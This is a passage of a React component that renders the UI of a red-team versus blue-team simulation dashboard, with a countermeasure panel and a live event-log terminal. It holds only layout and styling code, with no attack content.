                        <span>🛡️ CERBERUS-RE Autonomous Defense:</span>
                        <span>Reaction: {phase.blueCountermeasure.latencyMs}ms</span>
                      </div>
                      <div style={{ color: "var(--fg-2)" }}>{phase.blueCountermeasure.actionTaken}</div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>

        {/* Right: Live Adversary & Defense Telemetry Terminal */}
        <div style={{
          background: "var(--surface)",
          border: "1px solid var(--border)",
          borderRadius: 8,
          padding: 16,
          display: "flex",
          flexDirection: "column",
          gap: 12
        }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", borderBottom: "1px solid var(--border)", paddingBottom: 8 }}>
            <div style={{ fontSize: 13, fontWeight: 800, color: "var(--fg)", display: "flex", alignItems: "center", gap: 6 }}>
              <Terminal size={15} color="var(--primary)" />
              Real-Time War Room Event Stream
            </div>
            <span style={{ fontSize: 10, color: "#10b981", fontFamily: "monospace" }}>● LIVE INGEST</span>
          </div>

          <div style={{
            background: "#020408",
            border: "1px solid var(--border)",
            borderRadius: 6,
            padding: 12,
            fontFamily: "'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace",
            fontSize: 11,
            lineHeight: 1.6,
            minHeight: 480,
            maxHeight: 520,
            overflowY: "auto",
            display: "flex",
            flexDirection: "column",
            gap: 6
          }}>
            {logFeed.length === 0 ? (
              <div style={{ color: "var(--muted)", textAlign: "center", padding: "80px 20px" }}>
                Click [Start Live Simulation] or [Step Phase] to initiate autonomous red adversary vs blue defense engine.
              </div>
            ) : (
              logFeed.map((log, lIdx) => {
                const isRed = log.type === "RED";
                return (
                  <div key={lIdx} style={{ display: "flex", gap: 8 }}>
                    <span style={{ color: "var(--muted)", userSelect: "none" }}>[{log.timestamp}]</span>
                    <span style={{ color: isRed ? "#f87171" : "#34d399", fontWeight: isRed ? 700 : 500 }}>
                      {log.message}
                    </span>
                  </div>
                );
              })
            )}
          </div>
        </div>
      </div>
    </div>
  );
}
